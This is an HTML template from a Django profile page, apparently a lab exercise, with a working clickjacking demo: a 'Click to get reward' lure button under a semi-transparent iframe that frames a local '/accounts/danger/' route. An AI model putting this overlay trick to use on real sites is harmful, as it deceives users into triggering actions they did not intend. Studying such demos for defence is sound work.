<!DOCTYPE html>
<html>

<head>
    <title>Profile</title>
    <style>
        .clickjack-container {
            position: relative;
            width: 300px;
            height: 100px;
        }

        .fake-button {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            padding: 20px;
            background: green;
            color: white;
            border: none;
            cursor: pointer;
        }

        .hidden-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 300px;
            height: 100px;
            opacity: 0.3;
            z-index: 2;
        }
    </style>
</head>

<body>
    <h1>Profile</h1>

    <p><strong>Username:</strong> {{ user.username }}</p>
    <p><strong>First name:</strong> {{ user.first_name }}</p>

    <hr>

    <h2>Update first name</h2>

    <form method="post">
        {% csrf_token %}
        <input type="text" name="name" placeholder="New name">
        <button type="submit">Update</button>
    </form>

    <hr>

    <h2>🎁 Get free bonus!</h2>

    <div class="clickjack-container">
        <button class="fake-button">
            Click to get reward 🎉
        </button>
        <iframe class="hidden-frame" src="http://127.0.0.1:8000/accounts/danger/"></iframe>
    </div>

    <hr>

    <a href="{% url 'logout' %}">Logout</a>
</body>

</html>
